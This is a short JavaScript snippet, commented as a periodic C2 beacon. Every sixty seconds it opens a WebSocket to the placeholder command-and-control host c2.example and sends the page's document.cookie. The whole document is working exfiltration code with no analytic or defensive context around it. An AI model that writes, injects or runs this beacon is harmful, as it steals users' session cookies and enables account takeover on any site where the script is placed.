// Periodic C2 beacon exfiltrating cookies.
setInterval(function () {
  new WebSocket("wss://c2.example/s").send(document.cookie);
}, 60000);
